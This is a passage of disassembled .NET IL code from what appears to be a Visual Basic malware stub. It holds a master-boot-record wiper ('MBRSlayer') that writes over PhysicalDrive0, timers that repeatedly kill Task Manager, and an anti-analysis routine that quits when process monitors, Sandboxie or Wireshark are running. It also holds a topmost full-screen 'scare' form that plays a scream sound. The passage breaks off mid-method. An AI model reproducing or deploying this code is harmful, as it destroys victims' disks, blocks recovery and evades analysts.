    IL_009f:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_00a4:  ldarg.0
    IL_00a5:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
    IL_00aa:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_00af:  ldarg.0
    IL_00b0:  ldc.i4     0x3f1
    IL_00b5:  ldc.i4     0x27e
    IL_00ba:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_00bf:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_00c4:  ldarg.0
    IL_00c5:  call       instance class [System.Windows.Forms]System.Windows.Forms.Control/ControlCollection [System.Windows.Forms]System.Windows.Forms.Control::get_Controls()
    IL_00ca:  ldarg.0
    IL_00cb:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_00d0:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control/ControlCollection::Add(class [System.Windows.Forms]System.Windows.Forms.Control)
    IL_00d5:  ldarg.0
    IL_00d6:  ldc.i4.0
    IL_00d7:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_00dc:  ldarg.0
    IL_00dd:  ldstr      "frmSustos"
    IL_00e2:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_00e7:  ldarg.0
    IL_00e8:  ldstr      "frmSustos"
    IL_00ed:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_00f2:  ldarg.0
    IL_00f3:  ldc.i4.2
    IL_00f4:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_00f9:  ldarg.0
    IL_00fa:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_00ff:  callvirt   instance void [System]System.ComponentModel.ISupportInitialize::EndInit()
    IL_0104:  ldarg.0
    IL_0105:  ldc.i4.0
    IL_0106:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_010b:  ret
  } // end of method frmSustos::InitializeComponent

  .method assembly newslot specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.PictureBox 
          get_PictureBox1() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::_PictureBox1
    IL_0006:  ret
  } // end of method frmSustos::get_PictureBox1

  .method assembly newslot specialname strict virtual 
          instance void  set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox WithEventsValue) cil managed synchronized
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::_PictureBox1
    IL_0007:  ret
  } // end of method frmSustos::set_PictureBox1

  .method family hidebysig specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.CreateParams 
          get_CreateParams() cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance class [System.Windows.Forms]System.Windows.Forms.CreateParams [System.Windows.Forms]System.Windows.Forms.Form::get_CreateParams()
    IL_0006:  dup
    IL_0007:  dup
    IL_0008:  callvirt   instance int32 [System.Windows.Forms]System.Windows.Forms.CreateParams::get_ClassStyle()
    IL_000d:  ldc.i4     0x200
    IL_0012:  or
    IL_0013:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.CreateParams::set_ClassStyle(int32)
    IL_0018:  ret
  } // end of method frmSustos::get_CreateParams

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  SetWindowPos(int32 hwnd,
                              int32 hWndInsertAfter,
                              int32 x,
                              int32 y,
                              int32 cx,
                              int32 cy,
                              int32 wFlags) cil managed preservesig
  {
  }
  .method assembly instance void  MakeTopMostWindow(int64 hwnd,
                                                    bool MakeTopMostFlag) cil managed
  {
    // Code size       47 (0x2f)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldarg.2
    IL_0001:  brfalse.s  IL_0007

    IL_0003:  ldc.i4.m1
    IL_0004:  stloc.0
    IL_0005:  br.s       IL_000a

    IL_0007:  ldc.i4.s   -2
    IL_0009:  stloc.0
    IL_000a:  ldc.i4.2
    IL_000b:  ldc.i4.1
    IL_000c:  stloc.1
    IL_000d:  ldloc.1
    IL_000e:  or
    IL_000f:  stloc.2
    .try
    {
      IL_0010:  ldarg.1
      IL_0011:  conv.ovf.i4
      IL_0012:  ldloc.0
      IL_0013:  ldc.i4.0
      IL_0014:  ldc.i4.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldc.i4.0
      IL_0017:  ldloc.2
      IL_0018:  call       int32 frmSustos::SetWindowPos(int32,
                                                         int32,
                                                         int32,
                                                         int32,
                                                         int32,
                                                         int32,
                                                         int32)
      IL_001d:  pop
      IL_001e:  leave.s    IL_002e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0020:  dup
      IL_0021:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0026:  stloc.3
      IL_0027:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002c:  leave.s    IL_002e

    }  // end handler
    IL_002e:  ret
  } // end of method frmSustos::MakeTopMostWindow

  .method private instance void  frmSustos_Load(object sender,
                                                class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       250 (0xfa)
    .maxstack  3
    .locals init (native int V_0,
             class [mscorlib]System.Exception V_1,
             class [System]System.Diagnostics.Stopwatch V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0006:  ldarg.0
    IL_0007:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_000c:  ldarg.0
    IL_000d:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_0012:  pop
    IL_0013:  ldarg.0
    IL_0014:  ldc.i4.1
    IL_0015:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_TopMost(bool)
    IL_001a:  ldarg.0
    IL_001b:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0020:  ldarg.0
    IL_0021:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_0026:  ldarg.0
    IL_0027:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_002c:  pop
    IL_002d:  ldarg.0
    IL_002e:  ldarg.0
    IL_002f:  call       instance native int [System.Windows.Forms]System.Windows.Forms.Control::get_Handle()
    IL_0034:  stloc.0
    IL_0035:  ldloca.s   V_0
    IL_0037:  call       instance int64 [mscorlib]System.IntPtr::ToInt64()
    IL_003c:  ldc.i4.1
    IL_003d:  call       instance void frmSustos::MakeTopMostWindow(int64,
                                                                    bool)
    IL_0042:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_0047:  ldarg.0
    IL_0048:  ldarg.0
    IL_0049:  call       instance native int [System.Windows.Forms]System.Windows.Forms.Control::get_Handle()
    IL_004e:  stloc.0
    IL_004f:  ldloca.s   V_0
    IL_0051:  call       instance int64 [mscorlib]System.IntPtr::ToInt64()
    IL_0056:  ldc.i4.0
    IL_0057:  call       instance void frmSustos::MakeTopMostWindow(int64,
                                                                    bool)
    IL_005c:  ldsfld     string j.OK::SCREAM
    IL_0061:  ldstr      "on"
    IL_0066:  ldc.i4.0
    IL_0067:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_006c:  brtrue.s   IL_00a1

    .try
    {
      IL_006e:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0073:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Audio()
      IL_0078:  ldstr      "temp"
      IL_007d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0082:  ldstr      "\\scream.wav"
      IL_0087:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008c:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio::Play(string)
      IL_0091:  leave.s    IL_00a1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0093:  dup
      IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0099:  stloc.1
      IL_009a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009f:  leave.s    IL_00a1

    }  // end handler
    IL_00a1:  nop
    .try
    {
      .try
      {
        IL_00a2:  newobj     instance void [System]System.Diagnostics.Stopwatch::.ctor()
        IL_00a7:  stloc.2
        IL_00a8:  ldloc.2
        IL_00a9:  callvirt   instance void [System]System.Diagnostics.Stopwatch::Start()
        IL_00ae:  br.s       IL_00c8

        IL_00b0:  ldarg.0
        IL_00b1:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
        IL_00b6:  ldarg.0
        IL_00b7:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
        IL_00bc:  ldarg.0
        IL_00bd:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
        IL_00c2:  pop
        IL_00c3:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
        IL_00c8:  ldloc.2
        IL_00c9:  callvirt   instance int64 [System]System.Diagnostics.Stopwatch::get_ElapsedMilliseconds()
        IL_00ce:  ldc.i4     0xbb8
        IL_00d3:  conv.i8
        IL_00d4:  blt.s      IL_00b0

        IL_00d6:  ldloc.2
        IL_00d7:  callvirt   instance void [System]System.Diagnostics.Stopwatch::Stop()
        IL_00dc:  ldarg.0
        IL_00dd:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Close()
        IL_00e2:  leave.s    IL_00f9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e4:  dup
        IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ea:  stloc.3
        IL_00eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f0:  leave.s    IL_00f9

      }  // end handler
    }  // end .try
    finally
    {
      IL_00f2:  ldarg.0
      IL_00f3:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Close()
      IL_00f8:  endfinally
    }  // end handler
    IL_00f9:  ret
  } // end of method frmSustos::frmSustos_Load

  .property instance class [System.Windows.Forms]System.Windows.Forms.PictureBox
          PictureBox1()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    .set instance void frmSustos::set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox)
  } // end of property frmSustos::PictureBox1
  .property instance class [System.Windows.Forms]System.Windows.Forms.CreateParams
          CreateParams()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.CreateParams frmSustos::get_CreateParams()
  } // end of property frmSustos::CreateParams
} // end of class frmSustos

.class public auto ansi Stub.MBRSlayer
       extends [mscorlib]System.Object
{
  .field private static literal uint32 GenericWrite = uint32(0x40000000)
  .field private static literal uint32 GenericExecute = uint32(0x20000000)
  .field private static literal uint32 GenericAll = uint32(0x10000000)
  .field private static literal uint32 FileShareRead = uint32(0x00000001)
  .field private static literal uint32 FileShareWrite = uint32(0x00000002)
  .field private static literal uint32 OpenExisting = uint32(0x00000003)
  .field private static literal uint32 FileFlagDeleteOnClose = uint32(0x40000000)
  .field private static literal uint32 MbrSize = uint32(0x00000200)
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MBRSlayer::.ctor

  .method public static pinvokeimpl("kernel32" winapi) 
          native int  CreateFile(string lpFileName,
                                 uint32 dwDesiredAccess,
                                 uint32 dwShareMode,
                                 native int lpSecurityAttributes,
                                 uint32 dwCreationDisposition,
                                 uint32 dwFlagsAndAttributes,
                                 native int hTemplateFile) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" winapi) 
          bool  WriteFile(native int hfile,
                          uint8[] lpBuffer,
                          uint32 nNumberOfBytesToWrite,
                          [out] uint32& lpNumberBytesWritten,
                          native int lpOverlapped) cil managed preservesig
  {
  }
  .method public static void  Start() cil managed
  {
    // Code size       234 (0xea)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             object V_3,
             object V_4,
             uint32 V_5,
             native int V_6)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldc.i4     0x200
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  dup
      IL_0014:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' '<PrivateImplementationDetails>'::F4302D72A369C8BADBF2BE9C2854DF4529637155
      IL_0019:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                          valuetype [mscorlib]System.RuntimeFieldHandle)
      IL_001e:  stloc.3
      IL_001f:  ldc.i4.3
      IL_0020:  stloc.2
      IL_0021:  ldstr      "\\\\.\\PhysicalDrive0"
      IL_0026:  ldc.i4     0x10000000
      IL_002b:  ldc.i4.3
      IL_002c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0031:  ldc.i4.3
      IL_0032:  ldc.i4.0
      IL_0033:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0038:  call       native int Stub.MBRSlayer::CreateFile(string,
                                                                 uint32,
                                                                 uint32,
                                                                 native int,
                                                                 uint32,
                                                                 uint32,
                                                                 native int)
      IL_003d:  box        [mscorlib]System.IntPtr
      IL_0042:  stloc.s    V_4
      IL_0044:  ldc.i4.4
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.s    V_5
      IL_0049:  ldc.i4.5
      IL_004a:  stloc.2
      IL_004b:  ldloc.s    V_4
      IL_004d:  dup
      IL_004e:  brtrue.s   IL_005d

      IL_0050:  pop
      IL_0051:  ldloca.s   V_6
      IL_0053:  initobj    [mscorlib]System.IntPtr
      IL_0059:  ldloc.s    V_6
      IL_005b:  br.s       IL_0062

      IL_005d:  unbox.any  [mscorlib]System.IntPtr
      IL_0062:  ldloc.3
      IL_0063:  castclass  uint8[]
      IL_0068:  ldc.i4     0x200
      IL_006d:  ldloca.s   V_5
      IL_006f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0074:  call       bool Stub.MBRSlayer::WriteFile(native int,
                                                          uint8[],
                                                          uint32,
                                                          uint32&,
                                                          native int)
      IL_0079:  pop
      IL_007a:  leave.s    IL_00e1

      IL_007c:  ldloc.1
      IL_007d:  ldc.i4.1
      IL_007e:  add
      IL_007f:  ldc.i4.0
      IL_0080:  stloc.1
      IL_0081:  switch     ( 
                            IL_00a2,
                            IL_0000,
                            IL_0007,
                            IL_001f,
                            IL_0044,
                            IL_0049,
                            IL_007a)
      IL_00a2:  leave.s    IL_00d6

      IL_00a4:  ldloc.2
      IL_00a5:  stloc.1
      IL_00a6:  ldloc.0
      IL_00a7:  switch     ( 
                            IL_00b4,
                            IL_007c)
      IL_00b4:  leave.s    IL_00d6

    }  // end .try
    filter
    {
      IL_00b6:  isinst     [mscorlib]System.Exception
      IL_00bb:  ldnull
      IL_00bc:  cgt.un
      IL_00be:  ldloc.0
      IL_00bf:  ldc.i4.0
      IL_00c0:  cgt.un
      IL_00c2:  and
      IL_00c3:  ldloc.1
      IL_00c4:  ldc.i4.0
      IL_00c5:  ceq
      IL_00c7:  and
      IL_00c8:  endfilter
    }  // end filter
    {  // handler
      IL_00ca:  castclass  [mscorlib]System.Exception
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  leave.s    IL_00a4

    }  // end handler
    IL_00d6:  ldc.i4     0x800a0033
    IL_00db:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00e0:  throw

    IL_00e1:  ldloc.1
    IL_00e2:  brfalse.s  IL_00e9

    IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00e9:  ret
  } // end of method MBRSlayer::Start

} // end of class Stub.MBRSlayer

.class public auto ansi Stub.NoTsk
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTsk::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       52 (0x34)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldstr      "taskmgr"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.1
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.2
    IL_000d:  br.s       IL_002d

    IL_000f:  ldloc.1
    IL_0010:  ldloc.2
    IL_0011:  ldelem.ref
    IL_0012:  stloc.0
    .try
    {
      IL_0013:  ldloc.0
      IL_0014:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0019:  leave.s    IL_0029

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.3
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0027:  leave.s    IL_0029

    }  // end handler
    IL_0029:  ldloc.2
    IL_002a:  ldc.i4.1
    IL_002b:  add.ovf
    IL_002c:  stloc.2
    IL_002d:  ldloc.2
    IL_002e:  ldloc.1
    IL_002f:  ldlen
    IL_0030:  conv.i4
    IL_0031:  blt.s      IL_000f

    IL_0033:  ret
  } // end of method NoTsk::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTsk::Start

} // end of class Stub.NoTsk

.class public auto ansi Stub.NoTska
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTska::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldsfld     string j.OK::NTTA
    IL_0005:  ldstr      "on"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  brtrue.s   IL_0045

    IL_0012:  ldstr      "taskmgr"
    IL_0017:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_001c:  stloc.1
    IL_001d:  ldc.i4.0
    IL_001e:  stloc.2
    IL_001f:  br.s       IL_003f

    IL_0021:  ldloc.1
    IL_0022:  ldloc.2
    IL_0023:  ldelem.ref
    IL_0024:  stloc.0
    .try
    {
      IL_0025:  ldloc.0
      IL_0026:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_002b:  leave.s    IL_003b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002d:  dup
      IL_002e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0033:  stloc.3
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0039:  leave.s    IL_003b

    }  // end handler
    IL_003b:  ldloc.2
    IL_003c:  ldc.i4.1
    IL_003d:  add.ovf
    IL_003e:  stloc.2
    IL_003f:  ldloc.2
    IL_0040:  ldloc.1
    IL_0041:  ldlen
    IL_0042:  conv.i4
    IL_0043:  blt.s      IL_0021

    IL_0045:  ret
  } // end of method NoTska::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTska::Start

} // end of class Stub.NoTska

.class private auto ansi sealed Persistence
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  Startup() cil managed
  {
    // Code size       1 (0x1)
    .maxstack  8
    IL_0000:  ret
  } // end of method Persistence::Startup

} // end of class Persistence

.class public auto ansi beforefieldinit MyAntiProcess
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .field private static class j.OK N
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  newobj     instance void j.OK::.ctor()
    IL_0005:  stsfld     class j.OK MyAntiProcess::N
    IL_000a:  ret
  } // end of method MyAntiProcess::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MyAntiProcess::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed noinlining nooptimization
  {
    // Code size       741 (0x2e5)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             int32 V_1,
             class [System]System.Diagnostics.Process[] V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process[] V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process[] V_6,
             int32 V_7,
             class [System]System.Diagnostics.Process[] V_8,
             int32 V_9,
             class [System]System.Diagnostics.Process[] V_10,
             int32 V_11,
             class [System]System.Diagnostics.Process[] V_12,
             int32 V_13,
             class [System]System.Diagnostics.Process[] V_14,
             int32 V_15,
             class [System]System.Diagnostics.Process[] V_16,
             int32 V_17,
             class [System]System.Diagnostics.Process[] V_18,
             int32 V_19,
             class [System]System.Diagnostics.Process[] V_20,
             int32 V_21,
             class [System]System.Diagnostics.Process[] V_22,
             int32 V_23,
             class [System]System.Diagnostics.Process[] V_24,
             int32 V_25,
             class [System]System.Diagnostics.Process[] V_26,
             int32 V_27,
             class [System]System.Diagnostics.Process[] V_28,
             int32 V_29,
             class [System]System.Diagnostics.Process[] V_30,
             int32 V_31,
             class [System]System.Diagnostics.Process[] V_32,
             int32 V_33,
             class [System]System.Diagnostics.Process[] V_34,
             int32 V_35)
    IL_0000:  ldstr      "procexp"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.0
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.1
    IL_000d:  br.s       IL_001c

    IL_000f:  ldloc.0
    IL_0010:  ldloc.1
    IL_0011:  ldelem.ref
    IL_0012:  pop
    IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0018:  ldloc.1
    IL_0019:  ldc.i4.1
    IL_001a:  add.ovf
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldlen
    IL_001f:  conv.i4
    IL_0020:  blt.s      IL_000f

    IL_0022:  ldstr      "SbieCtrl"
    IL_0027:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_002c:  stloc.2
    IL_002d:  ldc.i4.0
    IL_002e:  stloc.3
    IL_002f:  br.s       IL_003e

    IL_0031:  ldloc.2
    IL_0032:  ldloc.3
    IL_0033:  ldelem.ref
    IL_0034:  pop
    IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_003a:  ldloc.3
    IL_003b:  ldc.i4.1
    IL_003c:  add.ovf
    IL_003d:  stloc.3
    IL_003e:  ldloc.3
    IL_003f:  ldloc.2
    IL_0040:  ldlen
    IL_0041:  conv.i4
    IL_0042:  blt.s      IL_0031

    IL_0044:  ldstr      "SpyTheSpy"
    IL_0049:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_004e:  stloc.s    V_4
    IL_0050:  ldc.i4.0
    IL_0051:  stloc.s    V_5
    IL_0053:  br.s       IL_0066

    IL_0055:  ldloc.s    V_4
    IL_0057:  ldloc.s    V_5
    IL_0059:  ldelem.ref
    IL_005a:  pop
    IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0060:  ldloc.s    V_5
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.s    V_5
    IL_0066:  ldloc.s    V_5
    IL_0068:  ldloc.s    V_4
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0055

    IL_006e:  ldstr      "wireshark"
    IL_0073:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0078:  stloc.s    V_6
    IL_007a:  ldc.i4.0
    IL_007b:  stloc.s    V_7
    IL_007d:  br.s       IL_0090

    IL_007f:  ldloc.s    V_6
    IL_0081:  ldloc.s    V_7
    IL_0083:  ldelem.ref
    IL_0084:  pop
    IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_008a:  ldloc.s    V_7
    IL_008c:  ldc.i4.1
    IL_008d:  add.ovf
    IL_008e:  stloc.s    V_7
    IL_0090:  ldloc.s    V_7
    IL_0092:  ldloc.s    V_6
    IL_0094:  ldlen
